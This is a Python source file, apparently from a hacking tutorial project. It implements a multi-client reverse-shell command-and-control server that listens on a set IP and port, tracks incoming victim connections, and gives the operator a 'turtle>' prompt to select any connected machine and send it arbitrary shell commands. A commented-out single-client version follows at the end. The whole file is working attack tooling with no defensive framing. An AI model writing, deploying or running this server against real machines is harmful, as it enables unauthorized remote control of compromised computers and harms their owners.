# importing modules for socket creation and to execute over system
import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS=2
JOB_NUMBERS=[1,2]
queue= Queue()
all_connections=[]
all_address=[]


def create_socket():
    try:
        # declaring them globally
        global s
        global host
        global port
        host = "192.168.1.104"  # IP address of server
        port = 63332  # Port on which we want the communication to happen
        print("Socket Creation Started...")
        s = socket.socket()  # Socket Created\

        print("Socket Created.")

    except socket.error as msg:  # if any error while socket creation then print it
        print("Socket Creation] Error" + str(msg))


def bind_socket():
    try:
        global host
        global port
        global s
        s.bind((host, port))  # Socket binded with the host IP and port
        s.listen(5)  # listens for upcoming connection after every 5 sec
    except socket.error as msg:
        print("Socket Error" + str(msg))
        bind_socket()  # calling this function again, if failed


def accepting_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address= s.accept()
            s.setblocking(1)

            all_connections.append(conn)
            all_address.append(address)
            print("Connection has been established:"+ address[0])
        except:
            print("Error accepting connections")

def start_turtle():
    while True:
        cmd= input('turtle>')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn= get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognized")

def list_connections():
    results= ' '
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(2017)
        except:
            del all_connections[i]
            del all_address[i]
            continue
        results= (str(i) + " " + str(all_address[i][0]) +" " + str(all_address[i][1])+ "\n")
    print("Clients:" + "\n" + results)

def get_target(cmd):
    try:
        target= cmd.replace('select ', '')
        target= int(target)
        conn= all_connections[target]
        print("You are now connected to :" + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn
    except:
        print("Selection invalid")
        return None

def send_target_commands(conn):
    while True:
        try:
            cmd= input()
            if cmd== 'quit':
                break
            if len(str.encode(cmd))>0:
                conn.send(str.encode(cmd))
                client_response= str(conn.recv(20480),"utf-8")
                print(client_response, end= "")
        except:
            print("Error Sending Commands")
            break

def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t= threading.Thread(target= work)
        t.daemon= True
        t.start()

def work():
    while True:
        x= queue.get()
        if (x==1):
            create_socket()
            bind_socket()
            accepting_connections()
        if (x==2):
            start_turtle()

        queue.task_done()
def create_jobs():
    for x in JOB_NUMBERS:
        queue.put(x)
    queue.join()

create_workers()
create_jobs()

































# def socket_accept():
#     # s.accept() gives two outputs:
#     # one of them is object of the client system which we are reffering here as "conn"
#     # other(address) is a list of IP and port with which server was connected.
#
#     conn, address = s.accept()
#     print("Connection has been established " + address[0] + " " + str(address[1]))
#     send_command(conn)  # to send commands to the client's system
#     conn.close()  # connection is closed
































# def send_command(conn):
#     while True:  # infinite loop as we want multiple commands to be sent
#         cmd = input()
#         if cmd == 'quit':
#             conn.close()
#             s.close()
#             sys.exit()  # closes the cmd window
#         if len(str.encode(cmd)) > 0:
#             conn.send(str.encode(cmd))  # encoding command strings to bytes
#             client_response = str(conn.recv(1024),
#                                   "utf-8")  # recieving and decoding client's reponse in block of 1024 bytes
#             print(client_response, end=" ")
#
#
# def main():
#     create_socket()
#     bind_socket()
#     socket_accept()
#
#
# main()




